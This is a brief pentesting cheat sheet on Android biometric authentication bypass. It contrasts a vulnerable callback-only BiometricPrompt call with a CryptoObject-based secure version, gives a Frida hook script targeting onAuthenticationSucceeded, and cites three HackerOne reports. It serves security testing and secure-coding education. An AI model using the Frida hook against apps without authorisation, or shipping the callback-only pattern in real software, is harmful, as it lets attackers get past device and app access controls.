# Biometric Authentication Bypass

## Callback-Only vs CryptoObject

### VULNERABLE — Callback only
```java
biometricPrompt.authenticate(promptInfo);
// onAuthenticationSucceeded(result) → grant access
// Problem: Frida can call the callback directly
```

### SECURE — CryptoObject
```java
Cipher cipher = getCipher(); // tied to Keystore key
biometricPrompt.authenticate(promptInfo, new CryptoObject(cipher));
// onAuthenticationSucceeded: cipher.doFinal() actually works
// Cannot be faked without the biometric unlock
```

## Frida Bypass (callback-only)
```javascript
Java.perform(function() {
    var CB = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
    CB.onAuthenticationSucceeded.implementation = function(result) {
        console.log("[*] Biometric bypassed");
        this.onAuthenticationSucceeded(result);
    };
});
```

## HackerOne Reports
- #331489 — Bypass PIN/Fingerprint lock
- #490946 — Bypass lock protection
- #637194 — Bypass of biometrics security functionality
